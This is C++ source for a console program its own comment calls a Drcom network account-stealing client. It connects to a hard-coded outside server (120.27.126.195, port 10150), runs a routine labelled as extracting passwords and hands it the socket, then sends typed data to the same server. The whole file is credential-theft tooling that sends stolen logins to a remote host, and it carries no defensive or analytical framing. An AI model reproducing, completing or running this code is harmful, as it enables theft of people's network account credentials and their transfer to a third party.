// Drcom网络盗号客户端.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "Decrypt.h"
using namespace std;

//TCP_Server_Addr
const char ServerIP[20]	= "120.27.126.195";
const UINT ServerPort	= 10150;

void main()
{
	SockJolly sock;
	sock.Create();
	cout << "开始连接服务器..." << endl;
	sock.Connect(ServerIP, ServerPort);
	if (0 != WSAGetLastError()) {
		cout << "连接服务器失败，错误代码=" << WSAGetLastError() << endl;
		cin.get();
		return;
	}
	system("cls");
	cout << "服务器连接成功！" << endl;

	//提取密码
	CDecrypt DeMaster;
	DeMaster.StartDecrypt(&sock);

	char sSend[256];
	while (true)
	{
		fflush(stdin);
		cout << "请输入发送数据：";
		cin >> sSend;
		sock.Send(sSend, strlen(sSend));
	}
	sock.Close();
	cout << "已断开连接！" << endl;
	cin.get();
}
